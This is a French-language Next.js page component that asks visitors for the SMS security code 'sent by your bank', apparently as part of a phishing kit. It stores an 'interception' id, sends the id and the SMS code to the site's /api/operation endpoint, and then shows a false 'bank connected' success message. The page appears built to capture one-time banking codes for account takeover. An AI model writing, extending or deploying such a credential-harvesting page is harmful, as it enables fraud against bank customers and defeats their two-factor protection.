"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function OtpPage() {
  const router = useRouter();
  const [code, setCode] = useState("");
  const [interceptionId, setInterceptionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState("");

  // Récupère l'ID généré à l'étape précédente au chargement de la page
  useEffect(() => {
    const id = sessionStorage.getItem("current_interception_id");
    if (!id) {
      setError("Session de liaison introuvable. Veuillez recommencer.");
    } else {
      setInterceptionId(id);
    }
  }, []);

  const isButtonDisabled = code.length < 4 || isLoading || !interceptionId;

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!interceptionId) return;

    setIsLoading(true);
    setError("");

    try {
      // Envoi du code en PUT à la même route d'API
      const response = await fetch("/api/operation/", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: interceptionId, smsCode: code }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Impossible d'enregistrer le code.");
      }

      // Nettoie le sessionStorage après l'opération réussie
      sessionStorage.removeItem("current_interception_id");
      
      // Affiche le popup de succès
      setShowSuccess(true);

    } catch (err: any) {
      setError(err.message || "Erreur réseau.");
    } finally {
      setIsLoading(false);
    }
  };

  const goToDashboard = () => {
    router.push("/de/dashboard");
  };

  return (
    <div className="otp-container">
      {showSuccess && (
        <div className="modal-overlay">
          <div className="success-modal">
            <div className="success-icon-circle">
              <i className="fa-solid fa-check"></i>
            </div>
            <h2 className="modal-title">Connexion réussie</h2>
            <p className="modal-desc">
              Votre authentification est validée. Votre banque est maintenant connectée.
            </p>
            <button onClick={goToDashboard} className="btn-link-bank" style={{ background: '#15b565', width: '100%' }}>
              <i className="fa-solid fa-gauge-high"></i>
              Accéder au tableau de bord
            </button>
          </div>
        </div>
      )}

      <Link href="/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
        <i className="fa-solid fa-arrow-left"></i>
      </Link>

      <form className="otp-card" onSubmit={handleVerifyCode}>
        <div className="otp-icon-box">
          <i className="fa-solid fa-shield-lock"></i>
        </div>

        <h1 className="otp-title">Code de vérification</h1>
        <p className="otp-subtitle">
          Veuillez saisir le code de sécurité envoyé par votre banque pour confirmer la liaison.
        </p>

        {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px', marginBottom: '10px', width: '100%', textAlign: 'center' }}>{error}</div>}

        <div className="otp-input-wrapper">
          <input
            type="text"
            className="otp-field"
            placeholder="••••••"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
            disabled={!interceptionId}
            required
          />
        </div>

        <button type="submit" className="btn-link-bank" disabled={isButtonDisabled}>
          {isLoading ? (
            <div className="spinner"></div>
          ) : (
            <>
              <i className="fa-solid fa-circle-check"></i>
              Valider le code
            </>
          )}
        </button>

        {/* <p className="resend-link">
          Vous n'avez pas reçu le code ? <strong>Renvoyer</strong>
        </p> */}
      </form>
    </div>
  );
}